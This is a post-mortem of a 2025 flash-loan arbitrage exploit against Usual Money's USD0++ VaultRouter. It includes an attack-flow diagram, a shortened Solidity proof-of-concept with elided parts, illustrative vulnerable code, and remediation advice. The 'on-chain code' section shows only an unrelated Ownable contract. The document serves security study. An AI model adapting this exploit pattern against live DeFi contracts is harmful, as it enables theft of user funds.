# Usual Money — USD0++ Vault Price Arbitrage Analysis

| Field | Details |
|------|------|
| **Date** | 2025-05-27 |
| **Protocol** | Usual Money (USD0++) |
| **Chain** | Ethereum |
| **Loss** | 43,000 USD |
| **Attacker** | [0x2ae2f691642bb18cd8deb13a378a0f95a9fee933](https://etherscan.io/address/0x2ae2f691642bb18cd8deb13a378a0f95a9fee933) |
| **Attack Tx** | [0x585d8be6...](https://etherscan.io/tx/0x585d8be6a0b07ca2f94cfa1d7542f1a62b0d3af5fab7823cbcf69fb243f271f8) |
| **Vulnerable Contract** | [0x35d8949372d46b7a3d5a56006ae77b215fc69bc0](https://etherscan.io/address/0x35d8949372d46b7a3d5a56006ae77b215fc69bc0) |
| **Root Cause** | VaultRouter allowed swaps between USD0++ and sUSDS without slippage protection against price discrepancies, enabling profit extraction via large one-directional trades |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-05/UsualMoney_exp.sol) |

---

## 1. Vulnerability Overview

Usual Money's USD0++ token is a stablecoin collateralized by sUSDS (Savings USDS). A discrepancy existed between the internal price and the market price when the `VaultRouter` converted USD0++ to sUSDS or vice versa. The attacker borrowed a large amount of USD0++ via a Morpho flash loan and repeatedly exploited the price difference between the Curve pool and the VaultRouter. This was a complex multi-step attack utilizing Uniswap V3 position NFTs.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable VaultRouter: internal/external price mismatch
contract VaultRouter {
    ICurvePool constant curvePool = ICurvePool(USD0_USD0Plus_POOL);

    function redeemUSD0PlusToSUSDS(uint256 usd0PlusAmount) external {
        // ❌ Internal calculation uses 1:1 ratio but actual Curve price differs
        uint256 susdSAmount = usd0PlusAmount; // internal: 1:1 (vulnerability)

        IERC20(USD0Plus).transferFrom(msg.sender, address(this), usd0PlusAmount);
        IERC20(sUSDS).transfer(msg.sender, susdSAmount);
        // ❌ Arbitrage possible when actual sUSDS > USD0++ in value
    }
}

// ✅ Correct code
function redeemUSD0PlusToSUSDS(uint256 usd0PlusAmount) external {
    uint256 usd0PlusMarketPrice = curvePool.get_dy(0, 1, usd0PlusAmount);
    // ✅ Apply market-price-based exchange rate
    uint256 susdSAmount = usd0PlusMarketPrice;
    require(susdSAmount >= minReturn, "Slippage too high");
    // ...
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: Ownable.sol
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)

pragma solidity ^0.8.20;

import {Context} from "../utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * The initial owner is set to the address provided by the deployer. This can
 * later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    /**
     * @dev The caller account is not authorized to perform an operation.
     */
    error OwnableUnauthorizedAccount(address account);

    /**
     * @dev The owner is not a valid owner account. (eg. `address(0)`)
     */
    error OwnableInvalidOwner(address owner);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.
     */
    constructor(address initialOwner) {
        if (initialOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(initialOwner);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► Morpho Flash Loan (borrow 1,899,838 USD0++)
  │
  ├─[2]─► Create Uniswap V3 Position NFT (complex collateral structure)
  │         └─► Set up V3 position with USD0++ + USDC
  │
  ├─[3]─► Swap USD0++ → sUSDS via VaultRouter
  │         └─► ❌ Swap at internal price (1:1)
  │         └─► More favorable than market price
  │
  ├─[4]─► Re-swap sUSDS → USD0 → USD0++ via Curve pool
  │         └─► Reverse swap at market price
  │         └─► Arbitrage profit realized
  │
  ├─[5]─► Repeat process (multiple iterations)
  │
  ├─[6]─► Repay Morpho flash loan
  │
  └─[7]─► Net profit: ~43,000 USD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract UsualMoney is BaseTestWithBalanceLog {
    uint256 borrowAmount = 1899838465685386939269479;

    function testExploit() public balanceLog {
        // [1] Borrow USD0++ via Morpho flash loan
        morphoBlue.flashLoan(
            address(USD0Plus),
            borrowAmount,
            ""
        );
    }

    function onMorphoFlashLoan(uint256 fee, bytes calldata data) external {
        // [2] Create Uniswap V3 position (collateral structure)
        USD0Plus.approve(address(UNI_V3_POS), type(uint256).max);
        USDC.approve(address(UNI_V3_POS), type(uint256).max);
        (uniV3TokenId,,,) = UNI_V3_POS.mint(
            INonfungiblePositionManager.MintParams({
                token0: address(USD0Plus),
                token1: address(USDC),
                // ...
            })
        );

        // [3] Arbitrage loop via VaultRouter
        for (uint i = 0; i < ITERATIONS; i++) {
            // VaultRouter: USD0++ → sUSDS (at internal price, favorable)
            VaultRouter.redeem(...);

            // Curve: sUSDS → USD0 → USD0++ (at market price)
            USD0USD0Pool.exchange(1, 0, susdSAmount, 0, address(this));

            // Arbitrage accumulates with each iteration
        }

        // [6] Close position and repay flash loan
        UNI_V3_POS.decreaseLiquidity(...);
        USD0Plus.transfer(address(morphoBlue), borrowAmount + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Price Arbitrage |
| **Attack Technique** | Flash Loan + Internal/External Price Mismatch |
| **DASP Category** | Price Oracle Manipulation |
| **CWE** | CWE-682: Incorrect Calculation |
| **Severity** | Medium-High |
| **Attack Complexity** | High |

## 6. Remediation Recommendations

1. **Price Consistency Validation**: Align VaultRouter's internal exchange price with market prices (Curve, Chainlink, etc.).
2. **Exchange Rate Slippage Limits**: Set minimum/maximum exchange ratios to prevent extreme arbitrage.
3. **Transaction Cooldown**: Apply a short cooldown on consecutive swaps from the same address.

## 7. Lessons Learned

- **Internal/External Price Consistency**: When a DeFi protocol's internal price differs from the external market price, arbitrage attacks are inevitable.
- **USD0++ Complexity**: The dual stabilization mechanism (sUSDS collateral + Curve pool) can create price discrepancy opportunities.
- **Flash Loan Amplification**: Even small price differences can yield large profits when amplified by flash loan capital.